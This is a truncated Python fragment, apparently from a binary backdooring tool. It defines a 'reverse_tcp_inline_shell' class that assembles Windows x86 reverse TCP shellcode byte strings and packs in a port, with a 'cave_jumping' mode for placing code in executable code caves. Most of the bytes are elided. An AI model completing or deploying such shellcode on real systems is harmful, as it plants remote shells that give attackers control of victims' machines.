...
class reverse_tcp_inline_shell():
    ...
    def run(self): #flItms, CavesPicked={}):
        ...
        if self.MODE.lower() == 'cave_jumping':
            ...
            self.shellcode1 += bytes("\x89\x00\x00\x00", 'iso-8859-1')

        self.shellcode1 += bytes("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
        ...
        self.shellcode2 = bytes("\x5d\x68\x33\x32\x00\x00\x68"
        ...
        self.shellcode2 += bytes("\x68\x02\x00", 'iso-8859-1')
        self.shellcode2 += struct.pack('!H', int(self.PORT)) # PORT
        self.shellcode2 += bytes("\x89\xe6\x6a\x10\x56"
